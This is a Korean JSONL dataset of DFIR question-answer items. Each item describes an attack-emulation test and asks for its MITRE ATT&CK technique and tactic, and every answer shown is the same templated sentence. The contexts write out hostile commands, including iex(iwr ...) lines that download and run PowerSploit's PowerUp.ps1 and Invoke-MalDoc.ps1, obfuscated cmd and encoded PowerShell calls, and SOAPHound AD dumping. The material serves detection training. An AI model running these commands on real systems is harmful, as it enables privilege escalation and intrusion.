{"id": "T1059.001_1c0a870f-dc74-49cf-9afc-eccc45e58790_Q14", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] AtomicTestHarnesses를 이용해 -Command와 -EncodedArguments 조합을 다양하게 바꾸어 PowerShell 호출 패턴을 생성.\n[절차] 1) AtomicTestHarnesses 모듈 및 Out-ATHPowerShellCommandLineParameter 준비. 2) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ... -CommandParamVariation ... -UseEncodedArguments -EncodedArgumentsParamVariation ... -Execute 를 수행. 3) 인코딩된 인자를 사용하는 PowerShell 명령행 패턴을 관찰한다.\n[대표 명령 예시]\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_86a43bad-12e3-4e85-b97c-4d5cf25b95c3_Q15", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] -EncodedCommand 파라미터의 다양한 축약/변형(E, EncodedCommand 등)을 사용해 PowerShell 호출 패턴을 생성.\n[절차] 1) AtomicTestHarnesses 모듈/커맨드가 준비되어 있는지 확인. 2) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ... -EncodedCommandParamVariation ... -Execute 를 실행. 3) 서로 다른 -EncodedCommand 표기를 사용하는 명령행을 관찰한다.\n[대표 명령 예시]\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_0d181431-ddf3-4826-8055-2dbf63ae848b_Q16", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] -EncodedCommand + -EncodedArguments 조합으로 인코딩된 PowerShell 명령과 인자를 동시에 사용하는 고난도 호출 패턴 생성.\n[절차] 1) AtomicTestHarnesses 모듈 준비. 2) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ... -EncodedCommandParamVariation ... -UseEncodedArguments -EncodedArgumentsParamVariation ... -Execute 를 실행. 3) 인코딩된 명령과 인자를 사용하는 다양한 명령행 시그니처를 생성한다.\n[대표 명령 예시]\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_a538de64-1c74-46ed-aa60-b995ed302598_Q17", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] Base64 인코딩된 PowerShell 명령(-e)을 이용해 `Write-Host \"Hello, from PowerShell!\"` 를 실행하는 간단한 난독화 예시.\n[절차] 1) 'Write-Host \"Hello, from PowerShell!\"' 를 Base64로 인코딩한 문자열을 준비한다. 2) powershell.exe -e <base64> 로 실행한다. 3) 콘솔에 \"Hello, from PowerShell!\" 출력 여부를 확인한다.\n[대표 명령 예시]\npowershell.exe -e  #{obfuscated_code}", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_49eb9404-5e0f-4031-a179-b40f7be385e3_Q18", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] PowerSploit·PowerView 등에서 자주 보이는 악성 PowerShell Cmdlet 이름들을 함수로 정의하고 호출해, 탐지 로직 검증용 아티팩트를 생성.\n[절차] 1) 미리 정의된 악성 Cmdlet 이름 목록을 배열로 정의한다. 2) foreach 루프로 각 이름에 대해 단순 Write-Host 를 수행하는 함수 본문을 정의한다. 3) 다시 각 Cmdlet을 호출하여 실행 패턴을 생성한다.\n[대표 명령 예시]\n$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_1289f78d-22d2-4590-ac76-166737e1811b_Q19", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] PowerSploit의 PowerUp.ps1을 원격에서 로드해 Invoke-AllChecks로 로컬 권한 상승 가능성을 점검.\n[절차] 1) TLS 1.2를 강제 설정한 뒤, GitHub에서 PowerUp.ps1을 다운로드하여 IEX(iwr ...) 로 메모리에 로드한다. 2) Invoke-AllChecks 를 호출해 서비스 설정, 파일 권한, 레지스트리 등을 점검한다. 3) 출력 결과를 통해 가능한 LPE 경로를 검토한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_999bff6d-dc15-44c9-9f5c-e1051bfc86e1_Q20", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] nslookup 결과(TXT 레코드 등)에 임베딩된 페이로드를 PowerShell에서 평가해 실행하는 패턴을 모사 (예제에서는 whoami).\n[절차] 1) PowerShell 함수 nslookup 을 재정의하여 실제 nslookup 실행 후 \"whoami\" 문자열을 반환하도록 설정. 2) powershell .(nslookup -q=txt example.com 8.8.8.8)[-1] 를 실행해 반환된 문자열을 스크립트 블록으로 평가. 3) 결과적으로 whoami 명령이 실행되는 것을 확인한다.\n[대표 명령 예시]\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_6a5b2a50-d037-4879-bf01-43d4d6cbf73f_Q21", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] SOAPHound.exe를 이용해 AD 환경에서 BloodHound용 데이터를 수집·덤프하는 PowerShell 실행.\n[절차] 1) SOAPHound.exe 경로와 인증 정보(사용자, 비밀번호, 도메인, DC IP)를 지정한다. 2) --bhdump, --cachefilename, --outputdirectory 옵션을 주고 실행한다. 3) 지정된 출력 디렉터리에 BloodHound 데이터 파일이 생성된다.\n[대표 명령 예시]\n#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.001_4099086c-1470-4223-8085-8186e1ed5948_Q22", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.001 Command and Scripting Interpreter: PowerShell (Tactic: Execution)\n[요약] SOAPHound를 이용해 도메인 캐시를 사전에 구축하는 시나리오 (--buildcache).\n[절차] 1) SOAPHound.exe 경로와 사용자/도메인/DC 정보를 지정한다. 2) --buildcache --cachefilename 옵션으로 실행해 캐시 파일을 생성한다. 3) c:\\temp\\cache.txt (기본값)에 캐시가 저장되는지 확인한다.\n[대표 명령 예시]\n#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}", "answer": "이 행위는 MITRE ATT&CK의 T1059.001 \"Command and Scripting Interpreter: PowerShell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.003_9e8894c0-50bd-4525-a96c-d4ac78ece388_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.003 Command and Scripting Interpreter: Windows Command Shell (Tactic: Execution)\n[요약] 간단한 .bat 스크립트를 디스크에 생성하고, Start-Process로 실행하여 CMD를 통해 명령을 수행하는 패턴.\n[절차] 1) 입력 인자 command_to_execute(기본값: dir)를 사용해 배치 스크립트 내용을 구성한다. 2) 지정된 script_path에 .bat 파일을 생성하고 Set-Content로 명령을 기록한다. 3) PowerShell에서 Start-Process \"#{script_path}\" 로 배치 파일을 실행한다. 4) 실행 후 필요시 Remove-Item으로 스크립트를 삭제한다.\n[대표 명령 예시]\nStart-Process \"#{script_path}\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.003 \"Command and Scripting Interpreter: Windows Command Shell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.003_127b4afe-2346-4192-815c-69042bec570e_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.003 Command and Scripting Interpreter: Windows Command Shell (Tactic: Execution)\n[요약] CMD를 이용해 텍스트를 파일에 기록한 뒤, 같은 프로세스에서 바로 내용을 출력하는 패턴으로, 악성 파일 드롭 + 확인 절차를 단순화해 재현.\n[절차] 1) echo \"#{message}\" > \"#{file_contents_path}\" 로 지정 경로에 파일을 생성하고 내용을 기록한다. 2) type \"#{file_contents_path}\" 로 파일 내용을 콘솔에 출력한다. 3) 테스트 후 del 명령으로 파일을 삭제한다.\n[대표 명령 예시]\necho \"#{message}\" > \"#{file_contents_path}\" & type \"#{file_contents_path}\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.003 \"Command and Scripting Interpreter: Windows Command Shell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.003_d0eb3597-a1b3-4d65-b33b-2cda8d397f20_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.003 Command and Scripting Interpreter: Windows Command Shell (Tactic: Execution)\n[요약] 환경 변수(SubString 연산)를 악용해 cmd.exe를 간접 호출하는 난독화된 명령행 패턴을 재현.\n[절차] 1) %LOCALAPPDATA:~-3,1%md 구문을 사용해 실제 cmd.exe를 우회적으로 호출한다. 2) /c echo #{input_message} > #{output_file} 로 파일에 메시지를 기록한다. 3) type #{output_file} 로 내용을 출력한다. 4) 이와 같은 비표준 cmd 호출 패턴은 탐지 시그니처 설계 시 참고할 수 있다.\n[대표 명령 예시]\n%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}", "answer": "이 행위는 MITRE ATT&CK의 T1059.003 \"Command and Scripting Interpreter: Windows Command Shell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.003_6b2903ac-8f36-450d-9ad5-b220e8a2dcb9_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.003 Command and Scripting Interpreter: Windows Command Shell (Tactic: Execution)\n[요약] BlackByte 랜섬웨어가 tree.dll(랜섬 노트)을 Wordpad로 여러 번 열고 프린트하는 'Print Bombing' 행위를 Wordpad 다중 실행 + /p 인자로 모사.\n[절차] 1) 사전 조건으로 file_to_print 경로에 테스트용 텍스트 파일을 생성한다. 2) PowerShell에서 cmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" 를 실행한다. 3) 지정된 횟수(max_to_print, 기본 75)만큼 wordpad.exe 프로세스가 생성되며 파일을 출력하도록 시도한다. 4) 테스트 종료 후 Stop-Process -name wordpad -force 로 모든 Wordpad 인스턴스를 종료한다.\n[대표 명령 예시]\ncmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" | out-null", "answer": "이 행위는 MITRE ATT&CK의 T1059.003 \"Command and Scripting Interpreter: Windows Command Shell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.003_df81db1b-066c-4802-9bc8-b6d030c3ba8e_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.003 Command and Scripting Interpreter: Windows Command Shell (Tactic: Execution)\n[요약] cmd.exe 의 표준 입력 리다이렉션(cmd < file) 기능을 이용해 .cmd 파일 내용을 직접 읽어 실행하는 패턴으로, Raspberry Robin이 사용하는 방식과 유사.\n[절차] 1) 사전 조건으로 input_file 경로에 t1059.003_cmd.cmd 파일을 다운로드/저장한다. 2) cmd /r cmd<\"#{input_file}\" 를 실행하여 내부 cmd 가 파일 내용을 표준 입력으로 받아 명령을 실행한다. 3) 이 파일에는 calc.exe 실행 등 악성 페이로드 호출이 포함될 수 있다. 4) 별도 정리(cleanup)는 정의되어 있지 않으나, 실환경에선 파일 및 아티팩트를 수동 제거할 수 있다.\n[대표 명령 예시]\ncmd /r cmd<\"#{input_file}\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.003 \"Command and Scripting Interpreter: Windows Command Shell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.003_00682c9f-7df4-4df8-950b-6dcaaa3ad9af_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.003 Command and Scripting Interpreter: Windows Command Shell (Tactic: Execution)\n[요약] DarkGate 2단계처럼 cmd.exe에서 직접 VBScript를 디스크에 작성한 뒤, 즉시 해당 스크립트를 실행해 whoami를 수행하는 드롭퍼 패턴.\n[절차] 1) cmd.exe /c cd /d #{script_path} 로 작업 디렉터리를 지정된 script_path로 변경한다. 2) echo 를 이용해 VBS 코드를 #{script_name}.vbs 파일로 기록한다.    - Set objShell = CreateObject(\"WScript.Shell\")    - Set objExec = objShell.Exec(\"whoami\")    - 이후 객체를 정리(Set ... = Nothing)하는 코드가 포함된다. 3) 생성된 #{script_name}.vbs 를 바로 실행하여 whoami 명령을 수행한다. 4) 테스트 종료 후 .vbs 파일을 삭제한다.\n[대표 명령 예시]\nc:\\windows\\system32\\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs", "answer": "이 행위는 MITRE ATT&CK의 T1059.003 \"Command and Scripting Interpreter: Windows Command Shell\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.005_1620de42-160a-4fe5-bbaf-d3fef0181ce9_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.005 Command and Scripting Interpreter: Visual Basic (Tactic: Execution)\n[요약] PowerShell에서 cscript.exe를 호출해 VBScript(sys_info.vbs)를 실행하고, 로컬 시스템 정보를 TEMP 경로의 출력 파일(T1059.005.out.txt)에 저장하는 패턴.\n[절차] 1) 사전 조건으로 PathToAtomicsFolder\\T1059.005\\src\\sys_info.vbs 경로에 샘플 VBScript를 다운로드한다. 2) PowerShell에서 cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt 명령을 실행한다. 3) VBScript는 WMI/환경 정보 등을 조회해 결과를 표준 출력으로 내보내고, 이것이 리다이렉트되어 TEMP\\T1059.005.out.txt 파일에 기록된다. 4) 분석자는 해당 파일을 열어 수집된 로컬 컴퓨터 정보(호스트명, OS, 하드웨어 등)를 확인할 수 있다. 5) 테스트 종료 후 출력 파일은 Remove-Item으로 삭제하여 흔적을 정리한다.\n[대표 명령 예시]\ncscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt", "answer": "이 행위는 MITRE ATT&CK의 T1059.005 \"Command and Scripting Interpreter: Visual Basic\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.005_e8209d5f-e42d-45e6-9c2f-633ac4f1eefa_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.005 Command and Scripting Interpreter: Visual Basic (Tactic: Execution)\n[요약] 64비트 Microsoft Word 환경에서 악성 문서 매크로(Invoke-Maldoc)를 통해 인코딩된 VBS 코드를 ScriptControl로 실행하는 시나리오를 모사하며, 성공 시 \"ART T1059.005\" 메시지 박스를 표시.\n[절차] 1) 선행 조건으로 64비트 Microsoft Word가 설치되어 있어야 하며, COM 객체 \"Word.Application\"의 경로를 체크해 (x86)이 포함되지 않는지 확인한다. 2) PowerShell에서 Invoke-MalDoc.ps1 스크립트를 GitHub에서 다운로드하여 메모리에 로드한다. 3) Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\" 를 호출한다. 4) Word 매크로는 ScriptControl을 이용해 인코딩된 VBS 코드를 디코딩/실행하고, 기본 동작으로 \"ART T1059.005\" 내용을 가진 메시지 박스를 띄운다. 5) 테스트 종료 후 mshta 기반 보조 프로세스 등 잔여 프로세스를 Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"} 로 탐지 후 Stop-Process로 종료한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing);\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.005 \"Command and Scripting Interpreter: Visual Basic\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.005_8faff437-a114-4547-9a60-749652a03df6_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.005 Command and Scripting Interpreter: Visual Basic (Tactic: Execution)\n[요약] Word 매크로(VBA)를 이용해 메모리 상 문자열 포인터를 얻고, 해당 메모리 내용을 파일($env:TEMP\\atomic_t1059_005_test_output.bin)에 덤프하는 메모리 추출 기법을 에뮬레이션.\n[절차] 1) 선행 조건으로 Microsoft Word(기본 ms_product=Word)가 설치되어 있어야 하며, COM 객체 \"Word.Application\" 생성으로 존재 여부를 확인한다. 2) PowerShell에서 Invoke-MalDoc.ps1를 TLS1.2로 GitHub에서 다운로드 후 IEX로 로드한다. 3) Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\" 를 실행한다. 4) Word 매크로는 문자열을 메모리에 생성한 뒤, 해당 문자열의 포인터를 획득하고 이를 이용해 특정 메모리 영역의 내용을 읽어 TEMP 경로의 atomic_t1059_005_test_output.bin 파일로 저장한다. 5) 이 파일은 실제 환경에서는 크리덴셜/키/페이로드 조각 등 민감 데이터를 포함할 수 있는 영역 덤프를 의미하며, 메모리 포렌식 및 탐지 룰 설계 시 참고할 수 있다. 6) 테스트 종료 후 Remove-Item으로 출력 바이너리 파일을 삭제하여 환경을 원복한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing);\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.005 \"Command and Scripting Interpreter: Visual Basic\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.007_01d75adf-ca1b-4dd1-ac96-7c9550ad1035_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.007 Command and Scripting Interpreter: JavaScript (Tactic: Execution)\n[요약] cscript.exe로 JScript(sys_info.js)를 실행해 로컬 시스템 정보를 수집하고, 결과를 %TEMP%\\T1059.007.out.txt 파일에 저장하는 패턴.\n[절차] 1) 사전 조건으로 PathToAtomicsFolder\\T1059.007\\src\\sys_info.js 경로에 JScript 샘플(sys_info.js)을 생성·다운로드한다. 2) PowerShell 의 get_prereq 단계에서 대상 경로의 상위 디렉터리를 만들고, GitHub에서 sys_info.js를 내려받아 저장한다. 3) 명령 프롬프트에서 cscript \"#{jscript}\" > %tmp%\\T1059.007.out.txt 를 실행한다. 4) sys_info.js는 WMI/환경 변수 등을 이용해 호스트명, OS, 네트워크 등 시스템 정보를 표준 출력으로 내보내고, 이 출력은 리다이렉트되어 %TEMP%\\T1059.007.out.txt에 기록된다. 5) 분석자는 출력 파일을 열어 어떤 정보가 수집됐는지 확인할 수 있으며, 실제 공격에서는 이 파일이 후속 유출(압축/전송) 전 단계 아티팩트가 된다. 6) 테스트 종료 시 del %tmp%\\T1059.007.out.txt >nul 2>&1 로 출력 파일을 삭제해 흔적을 정리한다.\n[대표 명령 예시]\ncscript \"#{jscript}\" > %tmp%\\T1059.007.out.txt", "answer": "이 행위는 MITRE ATT&CK의 T1059.007 \"Command and Scripting Interpreter: JavaScript\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.007_0709945e-4fec-4c49-9faf-c3c292a74484_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.007 Command and Scripting Interpreter: JavaScript (Tactic: Execution)\n[요약] wscript.exe로 동일한 JScript(sys_info.js)를 GUI 모드로 실행해, 시스템 정보를 메시지 박스 형태로 4회 표시하는 패턴.\n[절차] 1) 사전 조건으로 PathToAtomicsFolder\\T1059.007\\src\\sys_info.js 경로에 JScript 샘플(sys_info.js)을 다운로드한다(위 cscript 테스트와 동일한 prereq 구조). 2) 명령 프롬프트에서 wscript \"#{jscript}\" 를 실행한다. 3) wscript.exe는 콘솔이 아닌 GUI 컨텍스트로 스크립트를 실행하며, 스크립트는 호스트명, OS 버전, 사용자 정보 등 시스템 정보를 순차적으로 네 개의 메시지 박스에 나누어 표시한다. 4) 사용자는 메시지 박스를 클릭하며 정보를 확인하게 되며, 실제 공격에서는 사용자 속이기/피싱(UI 기반 정보 노출) 시나리오로 확장될 수 있다. 5) 테스트는 별도의 정리(cleanup) 명령 없이 메시지 박스 종료와 함께 종료된다.\n[대표 명령 예시]\nwscript \"#{jscript}\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.007 \"Command and Scripting Interpreter: JavaScript\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1059.010_7b5d350e-f758-43cc-a761-8e3f6b052a03_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1059.010 Command and Scripting Interpreter: AutoHotKey & AutoIT (Tactic: Execution)\n[요약] AutoHotKey 실행 파일(AutoHotKeyU64.exe)을 이용해 calc.ahk 스크립트를 실행하고, 메시지 박스와 계산기(calc.exe)를 띄우는 시나리오. 실제 공격에서는 동일 패턴으로 키로깅, 명령 실행, 백그라운드 페이로드 실행 등에 악용될 수 있다.\n[절차] 1) 사전 준비로 PathToAtomicsFolder\\..\\ExternalPayloads\\ 경로를 만들고, AutoHotKey ZIP(ahk.zip)을 다운로드 후 압축을 해제하여 AutoHotKeyU64.exe를 준비한다. 2) 공격자는 calc.ahk 같은 AutoHotKey 스크립트를 PathToAtomicsFolder\\T1059.010\\src\\calc.ahk 에 배치한다. 이 스크립트에는 메시지 박스 출력과 calc.exe 